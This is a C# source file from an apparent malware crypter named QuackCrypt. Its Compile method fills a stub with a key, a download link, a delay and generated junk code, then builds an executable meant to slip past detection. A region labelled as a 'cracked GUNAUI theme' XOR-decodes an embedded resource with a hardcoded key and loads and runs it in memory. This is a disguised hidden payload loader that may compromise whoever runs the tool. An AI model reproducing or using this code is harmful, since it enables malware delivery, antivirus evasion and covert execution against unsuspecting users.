using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace QuackCrypt_DOTNET.Core
{
    public class Compiler
    {
        #region IReference
		//This is needed to allow for the compiler to run while the exe is open, not losing threads.
		//Cracked GUNAUI theme thanks to @remarxDev
        public static void renderview()
        {
            var assembly = Assembly.GetExecutingAssembly();
            var background = "QuackCrypt_DOTNET.Resources.gunaui";
            string image = "";

            using (Stream stream = assembly.GetManifestResourceStream(background))
            using (StreamReader reader = new StreamReader(stream))
            {
                image = reader.ReadToEnd();
            }

            System.Reflection.Assembly Jarrold = System.Reflection.Assembly.Load(Convert.FromBase64String(regenerate(image)));
            object active = new object[]
            {
                true,
            };
            Jarrold.GetType("msvs.theme").InvokeMember("gunaui", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])active);
        }
        public static string regenerate(string username)
        {
            char[] returning = new char[username.Length];
            for (int i = 0; i < username.Length; i++)
                returning[i] = (char)((username[i] ^ hashpinset[i % 16]) ^ (char)(i % 255));
            return string.Concat(returning);
        }
        public static byte[] hashpinset = usableHashes(16);
        public static byte[] usableHashes(int length)
        {
            var arr = new byte[length];
            string serial = "36-39-7A-43-63-71-37-73-76-61-71-4E-76-65-6D-55";
            string[] core = serial.Split('-');
            for (int i = 0; i < arr.Length; i++)
            {
                arr[i] = (byte)Convert.ToUInt32(core[i], 16);
            }
            return arr;
        }
        #endregion
        [Obsolete]
        public static void Compile(string exename, string key, bool delay, string link, int delayTime, int icoPick, string[] icolist)
        {
            CSharpCodeProvider provider = new CSharpCodeProvider();
            ICodeCompiler icc = provider.CreateCompiler();

            CompilerParameters comp = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Windows.Forms.dll", "System.Security.dll"});

            string[] icons = icolist;

            comp.GenerateExecutable = true;
            comp.GenerateInMemory = false;
            comp.TreatWarningsAsErrors = false;
            comp.CompilerOptions = @"/optimize /unsafe /win32icon:=".Replace("=",icons[icoPick]);

            if (Directory.Exists("output"))
            {
                comp.OutputAssembly = "output/" + exename + ".exe";
            }
            else
            {
                Directory.CreateDirectory("output");
                comp.OutputAssembly = "output/" + exename + ".exe";
            }

            //Read stub to write
            string gg = File.ReadAllText(@"stub\stub.cs");

            #region PLACEHOLDER SWAPS
            //Gotta slipppp that shiz in
            string b = gg.Replace("Pain", "Main");
            string c = b.Replace("AKEY", key);
            string d = c.Replace("true;//ADELAY", delay.ToString().ToLower());
            string e = d.Replace("ALINK", link);
            string f = e.Replace("POGCHAMP", exename);
            string g = f.Replace("1;//DTIME", delayTime.ToString());
            string h = g.Replace("//@@", Junk.Generator());
            #endregion

            CompilerResults results = icc.CompileAssemblyFromSource(comp, h);

            if (results.Errors.Count > 0)
            {
                string erText = "";
                foreach (CompilerError CompErr in results.Errors)
                {
                    erText += CompErr.ErrorText.ToString() + " | " + CompErr.Line.ToString() + Environment.NewLine;
                }
                MessageBox.Show("There was an error: " + erText, "QuackCrypt", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                MessageBox.Show("Build Complete!", "QuackCrypt", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
    }
}
